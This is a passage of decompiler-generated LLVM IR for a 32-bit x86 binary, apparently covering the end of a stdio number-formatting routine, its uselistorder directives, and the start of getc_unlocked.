  %v2_8061ac9 = inttoptr i32 %v1_8061ac9 to i32*
  store i32 ptrtoint (i32* @global_var_806e0a0.791 to i32), i32* %v2_8061ac9, align 4
  %v0_8061ad0 = load i32, i32* @ecx, align 4
  %v1_8061ad0 = add i32 %v0_8061ad0, 12
  store i32 %v1_8061ad0, i32* @ecx, align 4
  %v0_8061ad3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ad3

dec_label_pc_8061ad3:                             ; preds = %dec_label_pc_8061ab8, %dec_label_pc_8061ab1, %dec_label_pc_8061abc
  %v0_8061ad8 = phi i32 [ %v0_8061abc, %dec_label_pc_8061ab8 ], [ %v0_8061abc, %dec_label_pc_8061ab1 ], [ %v1_8061ad0, %dec_label_pc_8061abc ]
  %v0_8061ad3 = phi i32 [ %v0_8061ad372, %dec_label_pc_8061ab8 ], [ %v0_8061ad372, %dec_label_pc_8061ab1 ], [ %v0_8061ad3.pre, %dec_label_pc_8061abc ]
  %v1_8061ad3 = add i32 %v0_8061ad3, 1
  %v8_8061ad3 = icmp eq i32 %v1_8061ad3, 0
  store i32 %v1_8061ad3, i32* %ebx.global-to-local, align 4
  br i1 %v8_8061ad3, label %dec_label_pc_8061aed, label %dec_label_pc_8061ad6

dec_label_pc_8061ad6:                             ; preds = %dec_label_pc_8061ad3
  store i32 %v1_8061ad3, i32* %eax.global-to-local, align 4
  %v1_8061ad8 = inttoptr i32 %v0_8061ad8 to i32*
  store i32 176, i32* %v1_8061ad8, align 4
  %v0_8061ade = load i32, i32* %eax.global-to-local, align 4
  %v1_8061ade = sub i32 0, %v0_8061ade
  store i32 %v1_8061ade, i32* %eax.global-to-local, align 4
  %v1_8061ae0 = load i32, i32* @ecx, align 4
  %v2_8061ae0 = add i32 %v1_8061ae0, 4
  %v3_8061ae0 = inttoptr i32 %v2_8061ae0 to i32*
  store i32 %v1_8061ade, i32* %v3_8061ae0, align 4
  %v0_8061ae3 = load i32, i32* @ecx, align 4
  %v1_8061ae3 = add i32 %v0_8061ae3, 8
  %v2_8061ae3 = inttoptr i32 %v1_8061ae3 to i32*
  store i32 ptrtoint (i32* @global_var_806e093.790 to i32), i32* %v2_8061ae3, align 4
  %v0_8061aea = load i32, i32* @ecx, align 4
  %v1_8061aea = add i32 %v0_8061aea, 12
  store i32 %v1_8061aea, i32* @ecx, align 4
  br label %dec_label_pc_8061aed

dec_label_pc_8061aed:                             ; preds = %dec_label_pc_8061ad3, %dec_label_pc_8061ad6
  %v0_8061af1 = phi i32 [ %v0_8061ad8, %dec_label_pc_8061ad3 ], [ %v1_8061aea, %dec_label_pc_8061ad6 ]
  %v0_8061aed = load i32, i32* %edx.global-to-local, align 4
  %v1_8061aed = icmp eq i32 %v0_8061aed, 0
  br i1 %v1_8061aed, label %dec_label_pc_8061b00, label %dec_label_pc_8061af1

dec_label_pc_8061af1:                             ; preds = %dec_label_pc_8061aed
  %v1_8061af1 = inttoptr i32 %v0_8061af1 to i32*
  store i32 112, i32* %v1_8061af1, align 4
  %v0_8061af7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061af7 = load i32, i32* @ecx, align 4
  %v2_8061af7 = add i32 %v1_8061af7, 4
  %v3_8061af7 = inttoptr i32 %v2_8061af7 to i32*
  store i32 %v0_8061af7, i32* %v3_8061af7, align 4
  %v0_8061afa = load i32, i32* %edi.global-to-local, align 4
  %v1_8061afa = load i32, i32* @ecx, align 4
  %v2_8061afa = add i32 %v1_8061afa, 8
  %v3_8061afa = inttoptr i32 %v2_8061afa to i32*
  store i32 %v0_8061afa, i32* %v3_8061afa, align 4
  %v0_8061afd = load i32, i32* @ecx, align 4
  %v1_8061afd = add i32 %v0_8061afd, 12
  store i32 %v1_8061afd, i32* @ecx, align 4
  br label %dec_label_pc_8061b00

dec_label_pc_8061b00:                             ; preds = %dec_label_pc_8061aed, %dec_label_pc_8061af1
  %v0_8061b1e = phi i32 [ %v0_8061af1, %dec_label_pc_8061aed ], [ %v1_8061afd, %dec_label_pc_8061af1 ]
  br i1 %v1_806191a, label %dec_label_pc_8061b14, label %dec_label_pc_8061b07

dec_label_pc_8061b07:                             ; preds = %dec_label_pc_8061b00
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_8061b0e = load i8, i8* %v2_8061aa7, align 1
  %v4_8061b0e = and i8 %v3_8061b0e, 16
  %v5_8061b0e = icmp eq i8 %v4_8061b0e, 0
  br i1 %v5_8061b0e, label %dec_label_pc_8061b31, label %dec_label_pc_8061b14

dec_label_pc_8061b14:                             ; preds = %dec_label_pc_8061b07, %dec_label_pc_8061b00
  %v0_8061b14 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061b16 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061b16 = sub i32 %v0_8061b14, %v1_8061b16
  store i32 %v2_8061b16, i32* %eax.global-to-local, align 4
  %v1_8061b18 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8061b18 = sub i32 %v2_8061b16, %v1_8061b18
  %v8_8061b18 = xor i32 %v1_8061b18, %v2_8061b16
  %v9_8061b18 = xor i32 %v2_8061b18, %v2_8061b16
  %v10_8061b18 = and i32 %v9_8061b18, %v8_8061b18
  %v11_8061b18 = icmp slt i32 %v10_8061b18, 0
  %v13_8061b18 = icmp slt i32 %v2_8061b18, 0
  %v2_8061b1a = icmp eq i1 %v13_8061b18, %v11_8061b18
  br i1 %v2_8061b1a, label %dec_label_pc_8061b31, label %dec_label_pc_8061b1c

dec_label_pc_8061b1c:                             ; preds = %dec_label_pc_8061b14
  %v2_8061b1c = sub i32 %v1_8061b18, %v2_8061b16
  store i32 %v2_8061b1c, i32* %ebp.global-to-local, align 4
  %v1_8061b1e = inttoptr i32 %v0_8061b1e to i32*
  store i32 176, i32* %v1_8061b1e, align 4
  %v0_8061b24 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8061b24 = load i32, i32* @ecx, align 4
  %v2_8061b24 = add i32 %v1_8061b24, 4
  %v3_8061b24 = inttoptr i32 %v2_8061b24 to i32*
  store i32 %v0_8061b24, i32* %v3_8061b24, align 4
  %v0_8061b27 = load i32, i32* @ecx, align 4
  %v1_8061b27 = add i32 %v0_8061b27, 8
  %v2_8061b27 = inttoptr i32 %v1_8061b27 to i32*
  store i32 ptrtoint (i32* @global_var_806e093.790 to i32), i32* %v2_8061b27, align 4
  %v0_8061b2e = load i32, i32* @ecx, align 4
  %v1_8061b2e = add i32 %v0_8061b2e, 12
  store i32 %v1_8061b2e, i32* @ecx, align 4
  br label %dec_label_pc_8061b31

dec_label_pc_8061b31:                             ; preds = %dec_label_pc_8061b14, %dec_label_pc_8061b07, %dec_label_pc_8061b1c
  %v1_8061bb484 = phi i32 [ %v0_8061b1e, %dec_label_pc_8061b14 ], [ %v0_8061b1e, %dec_label_pc_8061b07 ], [ %v1_8061b2e, %dec_label_pc_8061b1c ]
  %v12_8061b31 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8061b31, label %dec_label_pc_8061ba7, label %dec_label_pc_8061b38

dec_label_pc_8061b38:                             ; preds = %dec_label_pc_8061b31
  %v0_8061b3f = load i32, i32* %esi.global-to-local, align 4
  %v2_8061b3f = icmp slt i32 %v0_8061b3f, 0
  %v1_8061b41 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8061b3f, i32* %edx.global-to-local, align 4
  br i1 %v2_8061b3f, label %dec_label_pc_8061b50, label %dec_label_pc_8061b47

dec_label_pc_8061b47:                             ; preds = %dec_label_pc_8061b38
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061b59

dec_label_pc_8061b50:                             ; preds = %dec_label_pc_8061b38
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_8061b57 = sub i32 0, %v0_8061b3f
  store i32 %v1_8061b57, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061b59

dec_label_pc_8061b59:                             ; preds = %dec_label_pc_8061b47, %dec_label_pc_8061b50
  %v0_8061b6d77 = phi i32 [ %v0_8061b3f, %dec_label_pc_8061b47 ], [ %v1_8061b57, %dec_label_pc_8061b50 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8061b61 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8061b61, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8061b6d

dec_label_pc_8061b6d:                             ; preds = %dec_label_pc_8061b6d.backedge, %dec_label_pc_8061b59
  %v0_8061b7b = phi i32 [ %v0_8061b7e, %dec_label_pc_8061b6d.backedge ], [ 2, %dec_label_pc_8061b59 ]
  %v0_8061b77 = phi i32 [ %v0_8061b77.pre, %dec_label_pc_8061b6d.backedge ], [ %v2_8061b61, %dec_label_pc_8061b59 ]
  %v0_8061b6d = phi i32 [ %v9_8061b75, %dec_label_pc_8061b6d.backedge ], [ %v0_8061b6d77, %dec_label_pc_8061b59 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8061b74 = ashr i32 %v0_8061b6d, 31
  %v2_8061b75 = zext i32 %v0_8061b6d to i64
  %v4_8061b75 = zext i32 %v1_8061b74 to i64
  %v5_8061b75 = mul nuw i64 %v4_8061b75, 4294967296
  %v6_8061b75 = or i64 %v5_8061b75, %v2_8061b75
  %v8_8061b75 = sdiv i64 %v6_8061b75, 10
  %v9_8061b75 = trunc i64 %v8_8061b75 to i32
  store i32 %v9_8061b75, i32* %eax.global-to-local, align 4
  %v11_8061b75 = srem i64 %v6_8061b75, 10
  %v12_8061b75 = trunc i64 %v11_8061b75 to i8
  %v1_8061b77 = add i32 %v0_8061b77, -1
  store i32 %v1_8061b77, i32* %ebx.global-to-local, align 4
  %v1_8061b78 = add i8 %v12_8061b75, 48
  %v1_8061b7b = add i32 %v0_8061b7b, 1
  store i32 %v1_8061b7b, i32* %esi.global-to-local, align 4
  %v3_8061b7c = inttoptr i32 %v1_8061b77 to i8*
  store i8 %v1_8061b78, i8* %v3_8061b7c, align 1
  %v0_8061b7e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8061b75, i32* %edx.global-to-local, align 4
  %v7_8061b83 = icmp sgt i32 %v0_8061b7e, 3
  br i1 %v7_8061b83, label %dec_label_pc_8061b85, label %dec_label_pc_8061b6d.backedge

dec_label_pc_8061b85:                             ; preds = %dec_label_pc_8061b6d
  %v2_8061b85 = icmp eq i32 %v9_8061b75, 0
  %v1_8061b87 = icmp eq i1 %v2_8061b85, false
  br i1 %v1_8061b87, label %dec_label_pc_8061b6d.backedge, label %dec_label_pc_8061b89

dec_label_pc_8061b6d.backedge:                    ; preds = %dec_label_pc_8061b85, %dec_label_pc_8061b6d
  %v0_8061b77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061b6d

dec_label_pc_8061b89:                             ; preds = %dec_label_pc_8061b85
  %v0_8061b89 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8061b89, i32* %edx.global-to-local, align 4
  %v0_8061b8b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061b8b = add i32 %v0_8061b8b, -2
  store i32 %v1_8061b8b, i32* %eax.global-to-local, align 4
  %v1_8061b8e = trunc i32 %v0_8061b89 to i8
  %v3_8061b8e = add i32 %v0_8061b8b, -1
  %v4_8061b8e = inttoptr i32 %v3_8061b8e to i8*
  store i8 %v1_8061b8e, i8* %v4_8061b8e, align 1
  %v5_8061b91 = load i32, i32* %edx.global-to-local, align 4
  %v6_8061b91 = and i32 %v5_8061b91, -256
  %v7_8061b91 = or i32 %v6_8061b91, %stack_var_-42.0
  store i32 %v7_8061b91, i32* %edx.global-to-local, align 4
  %v2_8061b95 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8061b95 = add i32 %v2_8061b95, -2
  %v4_8061b95 = inttoptr i32 %v3_8061b95 to i8*
  store i8 %v1_8061b41, i8* %v4_8061b95, align 1
  %v0_8061b98 = load i32, i32* @ecx, align 4
  %v1_8061b98 = inttoptr i32 %v0_8061b98 to i32*
  store i32 112, i32* %v1_8061b98, align 4
  %v0_8061b9e = load i32, i32* %esi.global-to-local, align 4
  %v1_8061b9e = load i32, i32* @ecx, align 4
  %v2_8061b9e = add i32 %v1_8061b9e, 4
  %v3_8061b9e = inttoptr i32 %v2_8061b9e to i32*
  store i32 %v0_8061b9e, i32* %v3_8061b9e, align 4
  %v0_8061ba1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061ba1 = load i32, i32* @ecx, align 4
  %v2_8061ba1 = add i32 %v1_8061ba1, 8
  %v3_8061ba1 = inttoptr i32 %v2_8061ba1 to i32*
  store i32 %v0_8061ba1, i32* %v3_8061ba1, align 4
  %v0_8061ba4 = load i32, i32* @ecx, align 4
  %v1_8061ba4 = add i32 %v0_8061ba4, 12
  store i32 %v1_8061ba4, i32* @ecx, align 4
  br label %dec_label_pc_8061ba7

dec_label_pc_8061ba7:                             ; preds = %dec_label_pc_8061b31, %dec_label_pc_80617cc, %dec_label_pc_8061b89
  %v0_8061c28 = phi i32 [ %v1_8061bb484, %dec_label_pc_8061b31 ], [ %v2_80617d4, %dec_label_pc_80617cc ], [ %v1_8061ba4, %dec_label_pc_8061b89 ]
  %v2_8061ba7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8061ba7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061bab

dec_label_pc_8061bab:                             ; preds = %dec_label_pc_8061bab, %dec_label_pc_8061ba7
  %v0_8061bab = phi i32 [ %v2_8061ba7, %dec_label_pc_8061ba7 ], [ %v1_8061bad, %dec_label_pc_8061bab ]
  %stack_var_-216.0 = phi i32 [ %v3_80616bf, %dec_label_pc_8061ba7 ], [ %v5_8061bb0, %dec_label_pc_8061bab ]
  %v1_8061bab = inttoptr i32 %v0_8061bab to i32*
  %v2_8061bab = load i32, i32* %v1_8061bab, align 4
  store i32 %v2_8061bab, i32* %edx.global-to-local, align 4
  %v1_8061bad = add i32 %v0_8061bab, 12
  store i32 %v1_8061bad, i32* %eax.global-to-local, align 4
  %v5_8061bb0 = sub i32 %stack_var_-216.0, %v2_8061bab
  %v7_8061bb4 = icmp ult i32 %v1_8061bad, %v0_8061c28
  br i1 %v7_8061bb4, label %dec_label_pc_8061bab, label %dec_label_pc_8061bb8

dec_label_pc_8061bb8:                             ; preds = %dec_label_pc_8061bab
  %v5_8061bc1 = icmp eq i8 %stack_var_-26.0, 0
  %v1_8061bd1 = icmp eq i1 %v5_8061bc1, false
  %v2_8061bd1 = zext i1 %v1_8061bd1 to i32
  %v2_8061bd4 = sub i32 %v5_8061bb0, %v2_8061bd1
  store i32 %v2_8061bd4, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8061bd4, i32* %eax.global-to-local, align 4
  store i32 %v0_8061c28, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8061bd4, 1
  br i1 %tmp141, label %dec_label_pc_8061c2a, label %dec_label_pc_8061bea

dec_label_pc_8061bea:                             ; preds = %dec_label_pc_8061bb8
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_8061bf1 = inttoptr i32 %v1_80616ff to i8*
  %v3_8061bf1 = load i8, i8* %v2_8061bf1, align 1
  %v4_8061bf1 = and i8 %v3_8061bf1, 8
  %v5_8061bf1 = icmp eq i8 %v4_8061bf1, 0
  br i1 %v5_8061bf1, label %dec_label_pc_8061c0c, label %dec_label_pc_8061bf7

dec_label_pc_8061bf7:                             ; preds = %dec_label_pc_8061bea
  %v1_8061bf7 = add i32 %v0_8061c28, 12
  store i32 %v1_8061bf7, i32* %esi.global-to-local, align 4
  %v1_8061bfa = inttoptr i32 %v0_8061c28 to i32*
  store i32 160, i32* %v1_8061bfa, align 4
  %v0_8061c00 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061c00 = load i32, i32* @ecx, align 4
  %v2_8061c00 = add i32 %v1_8061c00, 4
  %v3_8061c00 = inttoptr i32 %v2_8061c00 to i32*
  store i32 %v0_8061c00, i32* %v3_8061c00, align 4
  %v0_8061c03 = load i32, i32* @ecx, align 4
  %v1_8061c03 = add i32 %v0_8061c03, 8
  %v2_8061c03 = inttoptr i32 %v1_8061c03 to i32*
  store i32 ptrtoint (i32* @global_var_806e093.790 to i32), i32* %v2_8061c03, align 4
  br label %dec_label_pc_8061c2a

dec_label_pc_8061c0c:                             ; preds = %dec_label_pc_8061bea
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8061c13 = add i32 %tmp112, 16
  %v2_8061c13 = inttoptr i32 %v1_8061c13 to i32*
  %v3_8061c13 = load i32, i32* %v2_8061c13, align 4
  %v9_8061c13 = icmp eq i32 %v3_8061c13, 48
  %v1_8061c17 = icmp eq i1 %v9_8061c13, false
  br i1 %v1_8061c17, label %dec_label_pc_8061c24, label %dec_label_pc_8061c19

dec_label_pc_8061c19:                             ; preds = %dec_label_pc_8061c0c
  %v3_8061c19 = load i32, i32* %stack_var_-152, align 4
  %v5_8061c19 = add i32 %v3_8061c19, %v2_8061bd4
  store i32 %v5_8061c19, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8061c28

dec_label_pc_8061c1f:                             ; preds = %dec_label_pc_8061c30
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061c57

dec_label_pc_8061c24:                             ; preds = %dec_label_pc_8061c0c
  br label %dec_label_pc_8061c28

dec_label_pc_8061c28:                             ; preds = %dec_label_pc_8061c19, %dec_label_pc_8061c24
  store i32 %v0_8061c28, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8061c2a

dec_label_pc_8061c2a:                             ; preds = %dec_label_pc_8061bb8, %dec_label_pc_8061bf7, %dec_label_pc_8061c28
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8061c2c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8061c2c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061c30

dec_label_pc_8061c30:                             ; preds = %dec_label_pc_8061c4e, %dec_label_pc_8061c2a
  call void @__pseudo_call(i32 %tmp112)
  %v0_8061c49 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061c49 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061c49 = add i32 %v1_8061c49, 4
  %v3_8061c49 = inttoptr i32 %v2_8061c49 to i32*
  %v4_8061c49 = load i32, i32* %v3_8061c49, align 4
  %v15_8061c49 = icmp eq i32 %v0_8061c49, %v4_8061c49
  %v1_8061c4c = icmp eq i1 %v15_8061c49, false
  br i1 %v1_8061c4c, label %dec_label_pc_8061c1f, label %dec_label_pc_8061c4e

dec_label_pc_8061c4e:                             ; preds = %dec_label_pc_8061c30
  %v1_8061c4e = add i32 %v1_8061c49, 12
  store i32 %v1_8061c4e, i32* %ebx.global-to-local, align 4
  %v0_8061c51 = load i32, i32* %edi.global-to-local, align 4
  %v2_8061c51 = add i32 %v0_8061c51, %v0_8061c49
  store i32 %v2_8061c51, i32* %edi.global-to-local, align 4
  %v1_8061c53 = load i32, i32* %esi.global-to-local, align 4
  %v7_8061c53 = icmp ult i32 %v1_8061c4e, %v1_8061c53
  br i1 %v7_8061c53, label %dec_label_pc_8061c30, label %dec_label_pc_8061c57

dec_label_pc_8061c57:                             ; preds = %dec_label_pc_8061c4e, %dec_label_pc_8061c1f
  %v0_8061c5d = phi i32 [ -1, %dec_label_pc_8061c1f ], [ %v2_8061c51, %dec_label_pc_8061c4e ]
  store i32 %v0_8061c5d, i32* %eax.global-to-local, align 4
  %v2_8061c60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8061c60, i32* @esi, align 4
  store i32 %v0_80616a2, i32* @edi, align 4
  store i32 %v0_80616a1, i32* @ebp, align 4
  ret i32 %v0_8061c5d

; uselistorder directives
  uselistorder i32 %v0_8061c5d, { 1, 0 }
  uselistorder i32 %v0_8061c49, { 1, 0 }
  uselistorder i32 %v1_8061bad, { 1, 2, 0 }
  uselistorder i32 %v0_8061bab, { 1, 0 }
  uselistorder i32 %v0_8061c28, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8061b7e, { 1, 0 }
  uselistorder i32 %v9_8061b75, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8061b6d, { 1, 0 }
  uselistorder i32 %v0_8061b3f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8061b18, { 1, 0 }
  uselistorder i32 %v1_8061b18, { 1, 0, 2 }
  uselistorder i32 %v2_8061b16, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8061a4c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8061a32, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8061a97, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80619fd, { 0, 2, 1 }
  uselistorder i32 %v1_80619d6, { 1, 0 }
  uselistorder i32 %v0_80619d1, { 1, 2, 0, 3 }
  uselistorder i32 %v2_806199e, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8061999, { 1, 0 }
  uselistorder i8 %v2_8061992, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8061992, { 1, 0, 3, 2 }
  uselistorder i32 %v0_806191c, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8061901, { 1, 0 }
  uselistorder i32 %v1_80618ed, { 1, 0 }
  uselistorder i32 %v0_80618e1, { 1, 0 }
  uselistorder i32 %v4_80618c8, { 1, 0 }
  uselistorder i32 %tmp148, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80618cd, { 1, 0 }
  uselistorder i32 %v2_806188b, { 1, 0, 2 }
  uselistorder i3 %v1_8061741, { 1, 0 }
  uselistorder i8 %v4_80617c0, { 1, 0 }
  uselistorder i32 %v3_80616ff, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_80616ff, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_80616d1, { 1, 0 }
  uselistorder i32 %v3_80616bf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 0, 1, 2 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 13, 14, 15, 3, 2, 1, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 15, 16, 17, 18, 19, 22, 23, 20, 21, 24, 27, 26, 28, 25, 29, 0, 3, 1, 4, 2, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edi.global-to-local, { 1, 3, 4, 2, 6, 5, 7, 8, 9, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 23, 22, 24, 0, 2, 3, 1, 7, 4, 5, 6, 8, 9, 10, 11 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 11, 6, 7, 0, 4, 3, 1, 5, 2, 8 }
  uselistorder i32* %eax.global-to-local, { 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 18, 19, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 48, { 12, 14, 2, 3, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i8 -53, { 1, 0 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 0, 4, 1, 2, 3 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i16 256, { 0, 3, 1, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_8061c2a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8061c28, { 1, 0 }
  uselistorder label %dec_label_pc_8061ba7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061b59, { 1, 0 }
  uselistorder label %dec_label_pc_8061b31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061b00, { 1, 0 }
  uselistorder label %dec_label_pc_8061aed, { 1, 0 }
  uselistorder label %dec_label_pc_8061ad3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061aa0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8061a8b, { 1, 0 }
  uselistorder label %dec_label_pc_8061a80, { 1, 0 }
  uselistorder label %dec_label_pc_8061a07, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80619f9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80619bf, { 1, 0 }
  uselistorder label %dec_label_pc_806198f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_806195b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806192a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8061915, { 1, 0 }
  uselistorder label %dec_label_pc_80617cc, { 1, 0 }
  uselistorder label %dec_label_pc_80616f0, { 1, 0 }
  uselistorder label %dec_label_pc_80616e7, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_1()
  %stack_var_-5 = alloca i8, align 1
  %v0_8061c64 = load i32, i32* @ebx, align 4
  %v4_8061c68 = ptrtoint i16* %tmp to i32
  store i32 %v4_8061c68, i32* @ebx, align 4
  %v1_8061c6c = add i32 %v4_8061c68, 16
  %v2_8061c6c = inttoptr i32 %v1_8061c6c to i32*
  %v3_8061c6c = load i32, i32* %v2_8061c6c, align 4
  %v2_8061c6f = add i32 %v4_8061c68, 24
  %v3_8061c6f = inttoptr i32 %v2_8061c6f to i32*
  %v4_8061c6f = load i32, i32* %v3_8061c6f, align 4
  %v10_8061c6f = icmp ult i32 %v3_8061c6c, %v4_8061c6f
  br i1 %v10_8061c6f, label %dec_label_pc_8061d11, label %dec_label_pc_8061c78

dec_label_pc_8061c78:                             ; preds = %entry
  %v2_8061c78 = load i16, i16* %tmp, align 2
  %v3_8061c78 = zext i16 %v2_8061c78 to i32
  %v1_8061c7b = and i32 %v3_8061c78, 131
  %v6_8061c85 = icmp ugt i32 %v1_8061c7b, 128
  br i1 %v6_8061c85, label %dec_label_pc_8061c9f, label %dec_label_pc_8061c87

dec_label_pc_8061c87:                             ; preds = %dec_label_pc_8061c78
  %v0_8061c87 = load i32, i32* @edx, align 4
  %v6_8061c8f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8061c87, i32 %v0_8061c87)
  %v1_8061c97 = icmp eq i32 %v6_8061c8f, 0
  %v1_8061c99 = icmp eq i1 %v1_8061c97, false
  br i1 %v1_8061c99, label %dec_label_pc_8061d36, label %dec_label_pc_8061c87.dec_label_pc_8061c9f_crit_edge

dec_label_pc_8061c87.dec_label_pc_8061c9f_crit_edge: ; preds = %dec_label_pc_8061c87
  %v0_8061c9f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061c9f

dec_label_pc_8061c9f:                             ; preds = %dec_label_pc_8061c87.dec_label_pc_8061c9f_crit_edge, %dec_label_pc_8061c78
  %v2_8061cd3 = phi i32 [ %v0_8061c9f.pre, %dec_label_pc_8061c87.dec_label_pc_8061c9f_crit_edge ], [ %v4_8061c68, %dec_label_pc_8061c78 ]
  %v1_8061c9f = inttoptr i32 %v2_8061cd3 to i32*
  %v2_8061c9f = load i32, i32* %v1_8061c9f, align 4
  store i32 %v2_8061c9f, i32* @ecx, align 4
  %v1_8061ca1 = urem i32 %v2_8061c9f, 65536
  store i32 %v1_8061ca1, i32* %edx.global-to-local, align 4
  %v2_8061ca4 = and i32 %v2_8061c9f, 2
  %v3_8061ca4 = icmp eq i32 %v2_8061ca4, 0
  br i1 %v3_8061ca4, label %dec_label_pc_8061cc2, label %dec_label_pc_8061ca9

dec_label_pc_8061ca9:                             ; preds = %dec_label_pc_8061c9f
  %v1_8061ca9 = urem i32 %v2_8061c9f, 2
  store i32 %v1_8061ca9, i32* %edx.global-to-local, align 4
  %v1_8061cac = add i32 %v2_8061c9f, 65535
  %v1_8061caf = trunc i32 %v1_8061cac to i16
  %v3_8061caf = inttoptr i32 %v2_8061cd3 to i16*
  store i16 %v1_8061caf, i16* %v3_8061caf, align 2
  %v0_8061cb2 = load i32, i32* @ebx, align 4
  %v1_8061cb2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8061cb2 = mul i32 %v1_8061cb2, 4
  %v3_8061cb2 = add i32 %v0_8061cb2, 36
  %v4_8061cb2 = add i32 %v3_8061cb2, %v2_8061cb2
  %v5_8061cb2 = inttoptr i32 %v4_8061cb2 to i8*
  %v6_8061cb2 = load i8, i8* %v5_8061cb2, align 1
  %v7_8061cb2 = zext i8 %v6_8061cb2 to i32
  %v9_8061cb2 = and i32 %v1_8061cb2, -256
  %v10_8061cb2 = or i32 %v7_8061cb2, %v9_8061cb2
